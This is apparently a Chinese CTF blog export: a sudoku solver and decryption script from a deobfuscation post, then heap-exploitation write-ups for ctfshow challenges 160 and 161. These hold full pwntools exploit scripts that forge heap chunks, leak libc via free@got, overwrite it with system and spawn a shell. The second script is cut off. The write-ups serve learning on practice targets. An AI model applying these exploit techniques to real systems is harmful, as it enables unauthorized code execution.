<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid</span>(<span class="params">board, row, col, num</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> board[row][j] == num:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> board[i][col] == num:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    start_row, start_col = <span class="number">3</span> * (row // <span class="number">3</span>), <span class="number">3</span> * (col // <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_row, start_row + <span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(start_col, start_col + <span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> board[i][j] == num:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">board, steps</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> board[i][j] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">                    <span class="keyword">if</span> is_valid(board, i, j, num):</span><br><span class="line">                        board[i][j] = num</span><br><span class="line">                        steps.append(num)</span><br><span class="line">                        <span class="keyword">if</span> solve(board, steps):</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                        board[i][j] = <span class="number">0</span></span><br><span class="line">                        steps.pop()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入数独（0 表示空格）</span></span><br><span class="line">sudoku = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">3</span>],</span><br><span class="line">    [<span class="number">4</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">6</span>],</span><br><span class="line">    [<span class="number">7</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">steps = []</span><br><span class="line">solve(sudoku, steps)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, steps)))</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">def <span class="title function_">build_reverse_map</span><span class="params">()</span>:</span><br><span class="line">    mp = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> orig in <span class="title function_">range</span><span class="params">(<span class="number">256</span>)</span>:</span><br><span class="line">        trans = (orig &amp; <span class="number">0xF3</span>) | (~orig &amp; <span class="number">0xC</span>)</span><br><span class="line">        enc = (trans - <span class="number">20</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        mp[enc] = orig</span><br><span class="line">    <span class="keyword">return</span> mp</span><br><span class="line"></span><br><span class="line">rev_map = build_reverse_map()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt(ciphertext: str) -&gt; str:</span><br><span class="line">    # 转成字节数组（这里输入是字符串形式的数字，需要转成字符列表）</span><br><span class="line">    data = <span class="built_in">list</span>(ciphertext)</span><br><span class="line">    n = len(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 密文实际是 ASCII 编码后的字符，而不是数字字符串</span><br><span class="line">    raw = [ord(c) <span class="keyword">for</span> c in ciphertext]</span><br><span class="line"></span><br><span class="line">    dec_bytes = []</span><br><span class="line">    <span class="keyword">for</span> b in raw:</span><br><span class="line">        <span class="keyword">if</span> b not in rev_map:</span><br><span class="line">            raise ValueError(f<span class="string">&quot;无法解码字节: &#123;b&#125;&quot;</span>)</span><br><span class="line">        dec_bytes.append(rev_map[b])</span><br><span class="line"></span><br><span class="line">    # 逆 step2: 相邻交换</span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">0</span>, n, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> j+<span class="number">1</span> &lt; n:</span><br><span class="line">            dec_bytes[j], dec_bytes[j+<span class="number">1</span>] = dec_bytes[j+<span class="number">1</span>], dec_bytes[j]</span><br><span class="line"></span><br><span class="line">    # 逆 step1: 半段交换</span><br><span class="line">    half = n <span class="comment">// 2</span></span><br><span class="line">    <span class="keyword">for</span> i in range(half):</span><br><span class="line">        dec_bytes[i], dec_bytes[i+half] = dec_bytes[i+half], dec_bytes[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes(dec_bytes).decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cipher = <span class="string">&quot;4693641762894685722843556137219876255986&quot;</span></span><br><span class="line">    print(decrypt(cipher))</span><br><span class="line">## KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J</span><br></pre></td></tr></table></figure>



<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>D810去平坦化插件使用</p>
<p><a href="https://gitlab.com/eshard/d810">插件</a></p>
<p>把文件夹和.py复制到IDA目录的plugin下即可</p>
<p><img src="/2025/09/09/%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/d108.png" alt="1"></p>
<p>效果很好。</p>
]]></content>
      <categories>
        <category>reverse</category>
        <category>总结</category>
        <category>去除控制流平坦化</category>
      </categories>
  </entry>
  <entry>
    <title>堆利用学习ctfshow(160~?)</title>
    <url>/2025/08/12/%E5%A0%86%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0ctfshow-160/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/KaliLinux_V/article/details/140321156">参考文章</a></p>
<h2 id="160"><a href="#160" class="headerlink" title="160"></a>160</h2><p>找到漏洞点在exit处</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_80488C0</span><span class="params">(<span class="type">unsigned</span> __int8 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; (<span class="type">unsigned</span> __int8)byte_804B061 &amp;&amp; *((_DWORD *)&amp;unk_804B080 + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text length: &quot;</span>)</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( **((_DWORD **)&amp;unk_804B080 + a1) + v2 &gt;= (<span class="type">unsigned</span> <span class="type">int</span>)(*((_DWORD *)&amp;unk_804B080 + a1) - <span class="number">4</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wtf?&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text: &quot;</span>);</span><br><span class="line">    sub_8048846(**((_DWORD **)&amp;unk_804B080 + a1), v2 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = __readgsdword(<span class="number">0x14u</span>) ^ v3;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    sub_8048EF0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">**((_DWORD **)&amp;unk_804B080 + a1) + v2 &gt;= (<span class="type">unsigned</span> <span class="type">int</span>)(*((_DWORD *)&amp;unk_804B080 + a1) - <span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>这个判断处在漏洞,它是通过限制修改的长度，使得我们自己创建的chunk地址加上修改长度不能超过系统创建的chunk的长度。</p>
<p>但是这种限制是可以绕过的。</p>
<p>虚拟机高级会自己检查出堆溢出，等我配个低级的虚拟机再继续来写，不然无法调试。</p>
<p>安装好了ubuntu20继续做题。</p>
<p>来动调看看变化，还是有自动检查，不知道什么问题。只能先放这里了，目前只只能理论上理解这题了。</p>
<p>附个佬的exp,再用图来解释攻击过程。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;xxxx&quot;</span>, xxxx)</span><br><span class="line"><span class="comment"># io = process(pwnfile)</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = ELF(<span class="string">&quot;xxxx.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :io.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims		    :io.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address,data       :log.success(<span class="string">&#x27;%s: &#x27;</span>%(address)+<span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data,size1,data1</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Action: &quot;</span>,<span class="string">b&quot;0&quot;</span>)</span><br><span class="line">	ru(<span class="string">b&quot;size of description: &quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size))</span><br><span class="line">	ru(<span class="string">b&quot;name: &quot;</span>)</span><br><span class="line">	sl(data)</span><br><span class="line">	ru(<span class="string">b&quot;text length: &quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size1))</span><br><span class="line">	ru(<span class="string">b&quot;text: &quot;</span>)</span><br><span class="line">	sl(data1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span>  <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Action: &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Action: &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,data</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Action: &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	ru(<span class="string">b&quot;text length: &quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size))</span><br><span class="line">	ru(<span class="string">b&quot;text: &quot;</span>)</span><br><span class="line">	sl(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&quot;aaaa&quot;</span>,<span class="number">0x80</span>,<span class="string">b&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&quot;aaaa&quot;</span>,<span class="number">0x80</span>,<span class="string">b&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&quot;aaaa&quot;</span>,<span class="number">0x80</span>,<span class="string">b&quot;/bin/sh;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&quot;vvvv&quot;</span>,<span class="number">0x100</span>,<span class="string">b&quot;gggg&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x200</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x108</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x89</span>)+<span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x89</span>)+p32(free_got))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_addr = u32(io.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p32(system_addr))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>Step 1：连续 <code>add</code> 三次后的初始布局（A 与 S 紧挨）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----------------------+ &lt;-- 0x8ee0000</span><br><span class="line">| 主chunk0 (0x80)      |  # add(0x80) &quot;aaaa&quot;</span><br><span class="line">| 数据区: 0x8ee0008     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0090</span><br><span class="line">| 系统chunk0 (0x80)    |  # add(0x80) &quot;bbbb&quot;</span><br><span class="line">| 数据区: 0x8ee0098     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0118</span><br><span class="line">| 主chunk1 (0x80)      |  # add(0x80) &quot;aaaa&quot;</span><br><span class="line">| 数据区: 0x8ee0120     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee01a0</span><br><span class="line">| 系统chunk1 (0x80)    |  # add(0x80) &quot;bbbb&quot;</span><br><span class="line">| 数据区: 0x8ee01a8     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0228</span><br><span class="line">| 主chunk2 (0x80)      |  # add(0x80) &quot;aaaa&quot;</span><br><span class="line">| 数据区: 0x8ee0230     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee02b0</span><br><span class="line">| 系统chunk2 (0x80)    |  # add(0x80) &quot;/bin/sh;&quot;</span><br><span class="line">| 数据区: 0x8ee02b8     |</span><br><span class="line">+----------------------+</span><br><span class="line">| TOP CHUNK            |</span><br><span class="line">高地址 ↑</span><br></pre></td></tr></table></figure>

<p>Step 2：<code>free(0)</code> 后，A0+S0 合并为空闲（低地址形成大洞）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----------------------+ &lt;-- 0x8ee0000</span><br><span class="line">| FREE(A0+S0)          |  # free(0) 后 A0 与 S0 合并为空闲段</span><br><span class="line">| 范围: 0x8ee0000 ~ 0x8ee0118</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0118</span><br><span class="line">| 主chunk1 (0x80)      |  # 保持不变</span><br><span class="line">| 数据区: 0x8ee0120     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee01a0</span><br><span class="line">| 系统chunk1 (0x80)    |  # 保持不变</span><br><span class="line">| 数据区: 0x8ee01a8     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0228</span><br><span class="line">| 主chunk2 (0x80)      |  # 保持不变</span><br><span class="line">| 数据区: 0x8ee0230     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee02b0</span><br><span class="line">| 系统chunk2 (0x80)    |  # 保持不变</span><br><span class="line">| 数据区: 0x8ee02b8     |</span><br><span class="line">+----------------------+</span><br><span class="line">| TOP CHUNK            |</span><br><span class="line">高地址 ↑</span><br></pre></td></tr></table></figure>

<p>Step 3：再次 <code>add(0x100, &quot;vvvv&quot;, 0x100, &quot;gggg&quot;)</code></p>
<p>新的 <strong>主chunk3(0x100)</strong> 优先复用低地址的 FREE（把洞吃掉）；</p>
<p>但配套的 <strong>系统chunk3(0x100)</strong> 因附近无相邻空间，只能从 <strong>TOP CHUNK</strong>（高地址）再切一块出来，因此被<strong>甩到更远处</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----------------------+ &lt;-- 0x8ee0000</span><br><span class="line">| 主chunk3 (0x100)     |  # 新的用户块，复用低地址 FREE</span><br><span class="line">| 数据区: 0x8ee0008     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0108</span><br><span class="line">| 主chunk1 (0x80)      |  # 仍在原位</span><br><span class="line">| 数据区: 0x8ee0120     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee01a0</span><br><span class="line">| 系统chunk1 (0x80)    |  # 仍在原位</span><br><span class="line">| 数据区: 0x8ee01a8     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0228</span><br><span class="line">| 主chunk2 (0x80)      |  # 仍在原位</span><br><span class="line">| 数据区: 0x8ee0230     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee02b0</span><br><span class="line">| 系统chunk2 (0x80)    |  # 仍在原位</span><br><span class="line">| 数据区: 0x8ee02b8     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0400           （举例）</span><br><span class="line">| 系统chunk3 (0x100)   |  # 从 TOP 切分的新系统块（远端高地址）</span><br><span class="line">| 数据区: 0x8ee0408     |</span><br><span class="line">+----------------------+</span><br><span class="line">| TOP CHUNK            |</span><br><span class="line">高地址 ↑</span><br></pre></td></tr></table></figure>

<p>Step 4：<code>edit(3,0x200, ...)</code> 溢出伪造</p>
<ul>
<li>主chunk3(0x100) 本来在低地址，edit(3,0x200, …) 写入 <strong>超过 0x100</strong> 的数据，覆盖到相邻的 <strong>主chunk1 &#x2F; 系统chunk1</strong> 的头部。</li>
<li>payload 把它们伪造成 <code>size=0x89</code> 的 fake chunk，并在 fd 指针写入 <strong>free@got</strong>。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----------------------+ &lt;-- 0x8ee0000</span><br><span class="line">| 主chunk3 (0x100)     |  # 用户可控，edit(3,...) 时从这里开始写</span><br><span class="line">| 数据区: 0x8ee0008     |</span><br><span class="line">| ... 溢出覆盖 ...      |</span><br><span class="line">| fake size=0x89       |  # 伪造chunk头</span><br><span class="line">| fd=free_got          |  # 链入 fastbin</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0108</span><br><span class="line">| 主chunk1 (伪造头)    |  # 被覆盖 size/FD 改掉</span><br><span class="line">| fd=free_got           |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee01a0</span><br><span class="line">| 系统chunk1 (0x80)    |  # header 被覆盖</span><br><span class="line">| ...                  |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0228</span><br><span class="line">| 主chunk2 (0x80)      |  # 还在原位</span><br><span class="line">| 数据区: 0x8ee0230     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee02b0</span><br><span class="line">| 系统chunk2 (0x80)    |  # /bin/sh</span><br><span class="line">| 数据区: 0x8ee02b8     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0400</span><br><span class="line">| 系统chunk3 (0x100)   |  # 远端 TOP 分配</span><br><span class="line">| 数据区: 0x8ee0408     |</span><br><span class="line">+----------------------+</span><br><span class="line">| TOP CHUNK            |</span><br><span class="line">高地址 ↑</span><br></pre></td></tr></table></figure>

<p>step 5：<code>show(1)</code> → 泄露 free@libc</p>
<ul>
<li>因为 fake FD 指向 <code>free_got</code>，show(1) 会打印出 GOT 表项内容（真实的 <code>free</code> 地址）。</li>
<li>通过 <code>free_addr - libc.sym[&#39;free&#39;]</code> 算出 libc 基址。</li>
</ul>
<p>Step 6：<code>edit(1,0x8,p32(system_addr))</code></p>
<ul>
<li>把 <code>free@got</code> 覆写成 <code>system</code>。</li>
</ul>
<p>Step 7：<code>free(2)</code></p>
<ul>
<li>系统chunk2 数据区存的是 <code>/bin/sh</code>；</li>
<li>执行 <code>free(2)</code> 实际调用了 <code>system(&quot;/bin/sh&quot;)</code> → getshell 🎉</li>
</ul>
<h2 id="161"><a href="#161" class="headerlink" title="161"></a>161</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_E3A</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; (<span class="type">int</span>)a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在edit函数中有off-by-one漏洞</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28311</span>)</span><br><span class="line"><span class="comment">#io = process(pwnfile)</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :io.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims		    :io.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address,data       :log.success(<span class="string">&#x27;%s: &#x27;</span>%(address)+<span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,data</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">	ru(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(idx))</span><br><span class="line">	ru(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size))</span><br><span class="line">	ru(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">	s(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span 